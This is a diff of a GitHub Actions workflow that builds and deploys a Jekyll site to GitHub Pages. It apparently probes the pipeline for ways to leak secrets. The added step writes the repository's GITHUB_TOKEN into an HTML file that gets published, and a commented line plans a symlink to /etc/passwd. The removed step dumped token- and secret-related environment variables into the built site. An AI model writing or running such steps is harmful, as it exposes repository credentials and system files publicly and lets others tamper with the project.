@@ -20,19 +20,32 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
+
+      # TEST: Can we inject into the build BEFORE Jekyll runs?
+      # Add a file that Jekyll will process
+      - name: Pre-build injection test
+        run: |
+          # Can we add files that end up in _site?
+          echo "Token: $GITHUB_TOKEN" > pre-injected.html
+          echo "Actions token: ${{ github.token }}" >> pre-injected.html
+          # Try to create a symlink that will be followed by tar
+          # ln -s /etc/passwd symlink-test.txt  (would be in _site after jekyll build)
+          
       - name: Setup Pages
         uses: actions/configure-pages@v5
+      
       - name: Build with Jekyll
         uses: actions/jekyll-build-pages@v1
         with:
           source: ./
           destination: ./_site
-      # TEST: Can we read environment variables during build?
-      - name: Capture env
+
+      # Check _site permissions
+      - name: Check _site permissions  
         run: |
-          echo "GITHUB_TOKEN: $GITHUB_TOKEN" >> _site/build-info.txt
-          echo "Token: ${{ github.token }}" >> _site/build-info.txt
-          env | grep -i "github\|pages\|token\|secret" >> _site/build-info.txt || true
+          ls -la _site/ 2>/dev/null | head -10 || echo "_site not found at expected path"
+          stat _site/ 2>/dev/null || echo "stat failed"
+
       - name: Upload artifact
         uses: actions/upload-pages-artifact@v3
 
